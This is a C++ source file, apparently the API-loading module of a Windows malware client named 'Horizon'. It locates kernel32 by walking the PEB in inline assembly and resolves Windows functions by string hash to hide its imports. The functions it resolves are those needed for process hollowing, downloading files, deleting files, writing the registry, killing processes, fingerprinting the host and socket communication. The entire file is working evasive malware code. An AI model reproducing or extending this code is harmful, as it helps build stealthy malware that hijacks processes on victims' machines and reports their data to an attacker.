#include "Api.h"
#include <string>

namespace Horizon::Client::Api
{
	DWORD GetKernel32() {
		DWORD dwBaseAddress = 0;
		_asm {
			xor ebx, ebx
			mov ebx, fs: [0x30]
			mov ebx, [ebx + 0x0C]
			mov ebx, [ebx + 0x14]
			mov ebx, [ebx]
			mov ebx, [ebx]
			mov ebx, [ebx + 0x10]
			mov dwBaseAddress, ebx
			}
		return dwBaseAddress;
	}

	size_t CalculateHash(std::string& name) {
		const std::hash<std::string> hash;
		return hash(name);
	}

	DWORD _GetProcAddress(HMODULE module, const size_t function) {
		DWORD returnAddress = 0;
		if (!module || !function) return NULL;
		const auto dosHeader = static_cast<PIMAGE_DOS_HEADER>(static_cast<void*>(module));
		if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE && dosHeader->e_lfanew != NULL) {
			auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(module) + dosHeader->e_lfanew);
			if (ntHeader->Signature == IMAGE_NT_SIGNATURE && ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
				const auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<DWORD>(module) + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
				const auto exportAddressTable = reinterpret_cast<FARPROC*>(reinterpret_cast<DWORD>(module) + exports->AddressOfFunctions);
				const auto exportNameTable = reinterpret_cast<char**>(reinterpret_cast<DWORD>(module) + exports->AddressOfNames);
				const auto exportOrdTable = reinterpret_cast<WORD*>(reinterpret_cast<DWORD>(module) + exports->AddressOfNameOrdinals);
				for (auto i = 0; i < static_cast<int>(exports->NumberOfNames); ++i) {
					std::string name = static_cast<char*>(reinterpret_cast<DWORD>(module) + exportNameTable[i]);
					if (CalculateHash(name) == function) {
						returnAddress = reinterpret_cast<DWORD>(module) + reinterpret_cast<DWORD>(exportAddressTable[
							exportOrdTable[i]]);
						break;
					}
				}
			}
		}
		return returnAddress;
	}

	bool LoadApis() {
		if ((Kernel32 = reinterpret_cast<HMODULE>(GetKernel32())) != nullptr) {
			_LoadLibraryW = reinterpret_cast<fnLoadLibraryW>(_GetProcAddress(Kernel32, HASH_LoadLibraryW));
			_GetProcessHeap = reinterpret_cast<fnGetProcessHeap>(_GetProcAddress(Kernel32, HASH_GetProcessHeap));
			_HeapAlloc = reinterpret_cast<fnHeapAlloc>(_GetProcAddress(Kernel32, HASH_HeapAlloc));
			_HeapReAlloc = reinterpret_cast<fnHeapReAlloc>(_GetProcAddress(Kernel32, HASH_HeapReAlloc));
			_HeapFree = reinterpret_cast<fnHeapFree>(_GetProcAddress(Kernel32, HASH_HeapFree));
			_VirtualAlloc = reinterpret_cast<fnVirtualAlloc>(_GetProcAddress(Kernel32, HASH_VirtualAlloc));
			_VirtualAllocEx = reinterpret_cast<fnVirtualAllocEx>(_GetProcAddress(Kernel32, HASH_VirtualAllocEx));
			_VirtualFree = reinterpret_cast<fnVirtualFree>(_GetProcAddress(Kernel32, HASH_VirtualFree));
			_WriteConsoleW = reinterpret_cast<fnWriteConsoleW>(_GetProcAddress(Kernel32, HASH_WriteConsoleW));
			_DeleteFileW = reinterpret_cast<fnDeleteFileW>(_GetProcAddress(Kernel32, HASH_DeleteFileW));
			_GetModuleFileNameW = reinterpret_cast<fnGetModuleFileNameW>(_GetProcAddress(Kernel32, HASH_GetModuleFileNameW));
			_CreateProcessW = reinterpret_cast<fnCreateProcessW>(_GetProcAddress(Kernel32, HASH_CreateProcessW));
			_GetThreadContext = reinterpret_cast<fnGetThreadContext>(_GetProcAddress(Kernel32, HASH_GetThreadContext));
			_SetThreadContext = reinterpret_cast<fnSetThreadContext>(_GetProcAddress(Kernel32, HASH_SetThreadContext));
			_ResumeThread = reinterpret_cast<fnResumeThread>(_GetProcAddress(Kernel32, HASH_ResumeThread));
			_ReadProcessMemory = reinterpret_cast<fnReadProcessMemory>(_GetProcAddress(Kernel32, HASH_ReadProcessMemory));
			_WriteProcessMemory = reinterpret_cast<fnWriteProcessMemory>(_GetProcAddress(Kernel32, HASH_WriteProcessMemory));
			_GetSystemInfo = reinterpret_cast<fnGetSystemInfo>(_GetProcAddress(Kernel32, HASH_GetSystemInfo));
			_GetComputerNameW = reinterpret_cast<fnGetComputerNameW>(_GetProcAddress(Kernel32, HASH_GetComputerNameW));
			_WideCharToMultiByte = reinterpret_cast<fnWideCharToMultiByte>(_GetProcAddress(Kernel32, HASH_WideCharToMultiByte));
			_MultiByteToWideChar = reinterpret_cast<fnMultiByteToWideChar>(_GetProcAddress(Kernel32, HASH_MultiByteToWideChar));
			_CreateToolhelp32Snapshot = reinterpret_cast<fnCreateToolhelp32Snapshot>(_GetProcAddress(Kernel32, HASH_CreateToolhelp32Snapshot));
			_Process32FirstW = reinterpret_cast<fnProcess32FirstW>(_GetProcAddress(Kernel32, HASH_Process32FirstW));
			_Process32NextW = reinterpret_cast<fnProcess32NextW>(_GetProcAddress(Kernel32, HASH_Process32NextW));
			_OpenProcess = reinterpret_cast<fnOpenProcess>(_GetProcAddress(Kernel32, HASH_OpenProcess));
			_TerminateProcess = reinterpret_cast<fnTerminateProcess>(_GetProcAddress(Kernel32, HASH_TerminateProcess));
			_CloseHandle = reinterpret_cast<fnCloseHandle>(_GetProcAddress(Kernel32, HASH_CloseHandle));
			_GetStdHandle = reinterpret_cast<fnGetStdHandle>(_GetProcAddress(Kernel32, HASH_GetStdHandle));
			_GlobalMemoryStatusEx = reinterpret_cast<fnGlobalMemoryStatusEx>(_GetProcAddress(Kernel32, HASH_GlobalMemoryStatusEx));
		}

		if ((Ntdll = _LoadLibraryW(L"NTDLL.DLL")) != nullptr) {
			_ZeroMemory = reinterpret_cast<fnRtlZeroMemory>(_GetProcAddress(Ntdll, HASH_RtlZeroMemory));
			_RtlGetVersion = reinterpret_cast<fnRtlGetVersion>(_GetProcAddress(Ntdll, HASH_RtlGetVersion));
			_NtQuerySystemInformation = reinterpret_cast<fnNtQuerySystemInformation>(_GetProcAddress(Ntdll, HASH_NtQuerySystemInformation));
			_NtQueryInformationProcess = reinterpret_cast<fnNtQueryInformationProcess>(_GetProcAddress(Ntdll, HASH_NtQueryInformationProcess));
		}

		if ((User32 = _LoadLibraryW(L"USER32.DLL")) != nullptr) {
			_MessageBoxW = reinterpret_cast<fnMessageBoxW>(_GetProcAddress(User32, HASH_MessageBoxW));
			_EnumDisplayDevicesW = reinterpret_cast<fnEnumDisplayDevicesW>(_GetProcAddress(User32, HASH_EnumDisplayDevicesW));
		}

		if ((Advapi32 = _LoadLibraryW(L"ADVAPI32.DLL")) != nullptr) {
			_GetUserNameW = reinterpret_cast<fnGetUserNameW>(_GetProcAddress(Advapi32, HASH_GetUserNameW));
			_RegCreateKeyExW = reinterpret_cast<fnRegCreateKeyExW>(_GetProcAddress(Advapi32, HASH_RegCreateKeyExW));
			_RegGetValueW = reinterpret_cast<fnRegGetValueW>(_GetProcAddress(Advapi32, HASH_RegGetValueW));
			_RegOpenKeyExW = reinterpret_cast<fnRegOpenKeyExW>(_GetProcAddress(Advapi32, HASH_RegOpenKeyExW));
			_RegSetValueExW = reinterpret_cast<fnRegSetValueExW>(_GetProcAddress(Advapi32, HASH_RegSetValueExW));
			_RegCloseKey = reinterpret_cast<fnRegCloseKey>(_GetProcAddress(Advapi32, HASH_RegCloseKey));
			_RegQueryValueExW = reinterpret_cast<fnRegQueryValueExW>(_GetProcAddress(Advapi32, HASH_RegQueryValueExW));
			_GetCurrentHwProfileW = reinterpret_cast<fnGetCurrentHwProfileW>(_GetProcAddress(Advapi32, HASH_GetCurrentHwProfileW));
		}

		if ((Urlmon = _LoadLibraryW(L"URLMON.DLL")) != nullptr) {
			_URLDownloadToFileW = reinterpret_cast<fnURLDownloadToFileW>(_GetProcAddress(Urlmon, HASH_URLDownloadToFileW));
		}

		if ((Ws2_32 = _LoadLibraryW(L"WS2_32.DLL")) != nullptr) {
			_WSAStartup = reinterpret_cast<fnWSAStartup>(_GetProcAddress(Ws2_32, HASH_WSAStartup));
			_WSACleanup = reinterpret_cast<fnWSACleanup>(_GetProcAddress(Ws2_32, HASH_WSACleanup));
			_socket = reinterpret_cast<fnsocket>(_GetProcAddress(Ws2_32, HASH_socket));
			_htons = reinterpret_cast<fnhtons>(_GetProcAddress(Ws2_32, HASH_htons));
			_inet_pton = reinterpret_cast<fninet_pton>(_GetProcAddress(Ws2_32, HASH_inet_pton));
			_InetPtonW = reinterpret_cast<fnInetPtonW>(_GetProcAddress(Ws2_32, HASH_InetPtonW));
			_connect = reinterpret_cast<fnconnect>(_GetProcAddress(Ws2_32, HASH_connect));
			_send = reinterpret_cast<fnsend>(_GetProcAddress(Ws2_32, HASH_send));
			_recv = reinterpret_cast<fnrecv>(_GetProcAddress(Ws2_32, HASH_recv));
			_setsockopt = reinterpret_cast<fnsetsockopt>(_GetProcAddress(Ws2_32, HASH_setsockopt));
			_ioctlsocket = reinterpret_cast<fnioctlsocket>(_GetProcAddress(Ws2_32, HASH_ioctlsocket));
			_closesocket = reinterpret_cast<fnclosesocket>(_GetProcAddress(Ws2_32, HASH_closesocket));
		}
		return true;
	}

#ifndef _DEBUG
	void GetHardwareId() {
		HW_PROFILE_INFO hwProfInfo;
		_GetCurrentHwProfileW(&hwProfInfo);
		const auto len = wcslen(hwProfInfo.szHwProfileGuid);
		hardwareId = new char[len + 1];
		WideToMulti(hwProfInfo.szHwProfileGuid, hardwareId);
	}
#endif

	void MultiToWide(char* str, wchar_t* str2) {
		_MultiByteToWideChar(CP_ACP, 0, str, -1, str2, strlen(str));
	}

	void WideToMulti(const wchar_t* str, char* str2) {
		_WideCharToMultiByte(CP_ACP, 0, str, -1, str2, wcslen(str), nullptr, nullptr);
	}
}
